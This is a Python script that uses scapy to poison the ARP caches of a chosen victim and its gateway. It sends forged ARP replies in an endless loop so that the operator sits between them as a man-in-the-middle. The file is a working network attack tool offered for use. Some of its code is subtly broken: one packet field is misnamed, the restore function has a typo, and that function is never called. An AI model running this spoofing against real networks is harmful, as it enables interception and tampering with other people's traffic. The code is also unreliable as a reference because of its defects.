from scapy.all import Ether, ARP, send, srp
from argparse import ArgumentParser
from os import getuid


def takeArguments():
    """
        Takes the commande line arguments and returns it to the main()
    """
    # Object of ArgumentParser() for handling the CLI Aruguments
    parser = ArgumentParser(description="Add the description of this tool here")

    # List of arguments
    parser.add_argument("-v", "--victim", type=str, help="set the IP address of the victim/target.")
    parser.add_argument("-r", "--router", type=str, help="set the IP address of the router/gateway.")
    parser.add_argument("-i", "--interface", type=str, help="set the interface to start ARP spoofing.")

    # Parse and return the arguments
    return parser.parse_args()

def get_mac(ip):
    """
        This function returns the MAC address of the IP address
    """

    brodcast = Ether(pdst="ff:ff:ff:ff:ff:ff") / ARP(pdst = ip)
    
    try:
        reply = srp(brodcast, timeout = 2, verbose = False)[0]
        mac = reply[0][1].hwsrc
        return mac
    
    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to find the MAC address of the victim")

def spoof(target_ip, spoof_ip, interface):
    """
        It will send the fake ARP packets to the victim/target and router
    """

    packet = ARP(
        op = 2, 
        pdst = target_ip,
        hwdst = get_mac(target_ip),
        psrc = spoof_ip
    )

    try: 
        send(packet, iface=interface, verbose = False)
        # print(f"[*] Spoofed packet sent to {target_ip}")
    
    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to send the spoofed packet!")

def restore(original_ip, spoofed_ip, interface):
    """
        It will restore the original MAC for the victim IP on ARP table
    """

    packet = ARP(
        op = 2, 
        psdt = original_ip,
        hwdst = get_mac(original_ip),
        psrc = spoofed_ip,
        hwsrc = get_mac(spoofed_ip)
    )

    try: 
        send(packet, iface=interface, count=3, verbose = False)
    
    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to send the restore packet!")

def main(args):
    if(getuid() != 0):
        exit("[!] Run this script as root!!!\n[!] Exiting...")

    sentPackets = 0

    try:
        print("Sending fake ARP request to the target and router...")

        while True:
            spoof(args.victim, args.router, args.interface)
            spoof(args.router, args.victim, args.interface)
            sentPackets += 2
            print(f"{args.victim} ---> You ---> {args.router} \t Total: {sentPackets}")

    except KeyboardInterrupt:
        print("[!] Keyboard Interupt:")
        print(f"Total spoofed packet sent: {sentPackets}")
        exit("Exiting...")

    except Exception as e:
        print(f"Error: {e}")
        exit("[!] Unable to send the packet!")
    
main(takeArguments())